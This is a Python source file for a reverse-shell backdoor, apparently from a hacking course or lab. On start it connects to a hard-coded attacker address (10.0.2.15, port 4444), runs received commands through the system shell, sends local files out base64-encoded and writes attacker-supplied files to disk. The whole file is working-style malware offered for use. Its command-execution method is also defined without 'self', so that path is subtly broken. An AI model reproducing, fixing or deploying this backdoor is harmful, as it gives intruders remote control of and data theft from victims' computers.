import socket
import subprocess
import json
import os
import base64


class Backdoor:
    """
    This Backdoor class generates a connection to the server machine and allow the hacker to send commands to the terminal

    """

    def __init__(self, ip, port):
        """
        This constructor creates a connection object using an IP address and port

        Args:
            ip (string): IP address of the hacker machine
            port (int): The port in which the comunication is occurring
        """
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(command):
        return subprocess.check_output(command, shell=True)

    def change_working_dir_to(self, path):
        os.chdir(path)
        return "[+] Changing working directory to" + path

    def write_file(self, file_name, data):
        with open(file_name, 'wb') as f:
            # Fix the bug that prevents from downloading images and other non-text files
            decoded_data = base64.b64decode(data)
            f.write(decoded_data)
            return '[+] Upload successful.'

    def read_file(self, path):
        with open(path, 'rb') as f:
            # Convert to known characters to allow python to read the file properly
            encoded_data = base64.b64encode(f.read())
            return encoded_data

    def start(self):
        """
        After the connection is established this keep the connection open and send the outputs of the commands in the terminal

        """
        while True:
            command = self.reliable_receive()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_dir_to(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1]).decode()
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(
                        command).decode()
            except Exception:
                command_result = "[-] Error during command execution."

            self.reliable_send(command_result)


my_backdoor = Backdoor('10.0.2.15', 4444)
my_backdoor.start()
